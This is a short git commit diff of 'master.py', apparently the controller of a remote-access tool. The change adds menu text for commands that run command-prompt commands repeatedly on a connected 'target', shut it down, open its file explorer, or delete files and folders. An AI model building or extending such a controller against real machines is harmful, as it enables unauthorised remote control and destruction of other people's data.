8041d20060bd95c3083e5faf8f9fe635c60699d2
Professor Kablammo <bumbum4321234@gmail.com>
2022-03-19 14:21:33 +1000

    Update master.py

--- master.py
+++ master.py
@@ -21,7 +21,10 @@ print(addr, "is connected to the server")
 targetname = conn.recv(1024)
 print("Host name is: " + targetname.decode())
 print("Commands are:")
-print("1. cmd(string, interger) - runs the command prompt command (string) interger amount of times")
+print("1. cmd(string: command, interger: iterations) - runs the command prompt command (string) interger amount of times")
+print("2. shutdown() - shuts down the computer")
+print("3. explorer() - opens up file explorer")
+print("4. delete(string: path) - deletes the specified file or folder (string)")
 while True:
     try:
         command = input("Enter Command: ")
